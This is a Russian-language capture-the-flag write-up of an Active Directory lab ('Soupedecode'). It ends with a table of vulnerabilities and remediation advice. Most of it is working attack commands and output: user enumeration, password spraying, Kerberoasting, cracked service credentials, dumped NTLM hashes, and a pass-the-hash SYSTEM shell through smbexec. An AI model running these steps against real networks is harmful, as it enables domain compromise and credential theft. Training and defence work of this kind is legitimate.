# Отчёт о проникновении в инфраструктуру Soupedecode

## Введение

В рамках задания проводилось тестирование на проникновение инфраструктуры Soupedecode. Цель — получить пользовательский и root-флаги, действуя как реальный атакующий в среде Active Directory. В отчёте последовательно описаны все этапы: разведка, перечисление пользователей, получение первичного доступа, Kerberoasting, Pass-the-Hash и финальное получение root-доступа. Включены все попытки, удачные и неудачные, с пояснениями, почему был выбран тот или иной вектор.

## 1. Первичная разведка (Nmap)

Сканирование целевого хоста выявило набор портов, характерный для контроллера домена Windows:

```
3389/tcp  RDP
135/tcp   MSRPC
445/tcp   SMB
139/tcp   NetBIOS
53/tcp    DNS
389/tcp   LDAP
88/tcp    Kerberos
```

По обнаруженным портам идентифицирован Active Directory и Windows-машина. Через LDAP получено имя контроллера домена: `DC01.SOUPEDECODE.LOCAL`.

## 2. Проверка SMB и шар

Анонимное подключение к SMB позволило получить список шар:

```
smbclient -L //10.128.162.13 -N
```

```
ADMIN$          Disk      Remote Admin
backup          Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
Users           Disk
```

Анонимного доступа к содержимому шар нет — при попытке чтения возвращается `NT_STATUS_ACCESS_DENIED`. Это нормально: список шар виден, но права на чтение требуют валидных учётных данных.

## 3. Попытка AS-REP Roasting

Первым делом проверена возможность AS-REP Roasting по известным именам (`admin`, `charlie`):

```
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User charlie doesn't have UF_DONT_REQUIRE_PREAUTH set
```

У этих пользователей включена Kerberos-преаутентификация, поэтому атака не сработала. Это ожидаемо для современных доменов.

## 4. Перечисление пользователей

### 4.1. LDAP и RPC

Попытка получить список пользователей через LDAP завершилась ошибкой `Operations error`. Попытка через `rpcclient` с анонимным доступом вернула `NT_STATUS_ACCESS_DENIED`.

### 4.2. Kerbrute

Перебор через `kerbrute` дал первые валидные имена:

```
[+] VALID USERNAME: Charlie@SOUPEDECODE.LOCAL
[+] VALID USERNAME: administrator@SOUPEDECODE.LOCAL
[+] VALID USERNAME: Admin@SOUPEDECODE.LOCAL
```

AS-REP Roasting по ним снова не сработал — преаутентификация включена у всех.

### 4.3. RID-циклинг через NetExec

Следующим шагом выполнен RID-циклинг под гостем:

```
netexec smb 10.129.176.195 -u 'guest' -p '' --rid-brute
```

Это дало полный список объектов домена: пользователей, групп и компьютеров. Среди них — сотни учётных записей вида `bmark0`, `otara1` и т.д., а также служебные учётки `file_svc`, `firewall_svc`, `web_svc`, `monitoring_svc` и учётные записи компьютеров (`WebServer$`, `FileServer$` и др.).

## 5. Формирование списка пользователей и Password Spraying

Из вывода RID-брута извлечены только имена пользователей:

```
grep SidTypeUser full_users.txt | sed 's/.*\\//; s\(SidTypeUser)\\'
```

Получен список `users.txt`. По нему выполнен Password Spraying с проверкой гипотезы «пароль совпадает с логином». Результат:

```
[+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

Учётная запись `ybob317` имеет пароль, совпадающий с логином. Это слабость, часто встречающаяся в учебных средах.

## 6. Получение пользовательского флага

С найденными кредами выполнено подключение к шаре `Users`:

```
smbclient //10.128.142.15/Users -U 'SOUPEDECODE.LOCAL\ybob317%ybob317'
```

С рабочего стола `ybob317` получен пользовательский флаг. Первая цель достигнута.

## 7. Неудачные попытки после получения доступа

Попытка Password Spraying с паролем `ybob317` по остальным пользователям успеха не дала. Попытка подключиться по RDP под `ybob317` также не удалась. Это ожидаемо: пользователь не имеет прав на интерактивный вход или его учётная запись ограничена.

## 8. Kerberoasting

С валидными кредами `ybob317` выполнен запрос TGS-тикетов для служебных учётных записей:

```
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip 10.128.142.15 -request -outputfile kerb_hashes.txt
```

Получены хеши для `file_svc`, `firewall_svc`, `backup_svc`, `web_svc`, `monitoring_svc`. Оффлайн-взлом через `john`/`hashcat` дал пароль для `file_svc`:

```
file_svc:Password123!!
```

Проверка через NetExec подтвердила валидность:

```
[+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

## 9. Доступ к шаре backup

С кредами `file_svc` выполнено подключение к шаре `backup`:

```
smbclient //10.128.142.15/backup -U 'file_svc%Password123!!'
```

Скачан файл `backup.txt`, содержащий NTLM-хеши учётных записей компьютеров:

```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:...:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:...:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:...:e41da7e79a4c76dbd9cf79d1cb325559:::
...
```

Формат — стандартный pwdump: имя, RID, LM-хеш (пустой), NT-хеш.

## 10. Pass-the-Hash

Формируем хэши

```bash
cat ntlm_hashes.txt| awk -F ":" '{print($4)}' > HASHES.txt
```
Формируем юзеров
```bash
cat ntlm_hashes.txt| sed 's/$:.*//' > ntlms.txt
```

Первая попытка Pass-the-Hash по всем учёткам дала только `(Guest)` — потому что в именах отсутствовал символ `$` в конце (учётные записи компьютеров в AD всегда заканчиваются на `$`). Это была ошибка невнимательности: `FileServer` вместо `FileServer$`.

После исправления выполнена проверка вручную:

```
nxc smb 10.128.142.15 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559
```

Результат:

```
[+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

`(Pwn3d!)` означает, что учётная запись компьютера `FileServer$` имеет права локального администратора на контроллере домена. Это ключевой момент: хеш из шары `backup` дал административный доступ.

## 11. Получение root-доступа

С хешем `FileServer$` выполнен запуск `smbexec`:

```
smbexec.py 'FileServer$'@10.128.142.15 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

Получен полуинтерактивный shell от `SYSTEM`. Root-флаг находился в директории `C:\Users\Administrator\Desktop`:

```
27cb2be302c388d63d27c86bfdd5f56a
```

Вторая цель достигнута. Задание пройдено полностью.

## Цепочка атаки

1. Nmap → порты AD (88, 389, 445, 53, 135, 139, 3389).
2. SMB → список шар, анонимный доступ закрыт.
3. AS-REP Roasting → не сработал (преаутентификация включена).
4. LDAP/RPC → доступ закрыт.
5. Kerbrute → первые имена (`Charlie`, `Admin`, `Administrator`).
6. RID-циклинг → полный список пользователей, групп и компьютеров.
7. Password Spraying → `ybob317:ybob317` → пользовательский флаг.
8. Kerberoasting → хеши служебных учёток → взлом `file_svc:Password123!!`.
9. Шара `backup` → NTLM-хеши компьютеров.
10. Pass-the-Hash → `FileServer$` даёт `(Pwn3d!)` → `smbexec` → SYSTEM → root-флаг.

## Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| Слабый пароль (username=password) | `ybob317:ybob317` | Первичный доступ |
| Kerberoasting | Служебные учётки с взламываемыми паролями | Доступ к `file_svc` |
| Хеши в открытой шаре | `backup.txt` с NTLM-хешами компьютеров | Компрометация учётных записей компьютеров |
| Права администратора у учётной записи компьютера | `FileServer$` имеет права на DC | Полный контроль над доменом |
| Pass-the-Hash | NTLM-аутентификация без пароля | Обход парольной защиты |

## Рекомендации по устранению

1. Запретить пароли, совпадающие с логином; внедрить политику сложности.
2. Использовать длинные случайные пароли для служебных учётных записей (≥ 25 символов) или managed service accounts.
3. Не хранить хеши в открытых SMB-шарах; ограничить доступ к `backup`.
4. Ограничить права учётных записей компьютеров; не давать им административных прав на DC.
5. Включить защиту от Pass-the-Hash (Credential Guard, LAPS, ограничение NTLM).
6. Мониторить Kerberoasting-запросы (большое число TGS-запросов от одного пользователя).
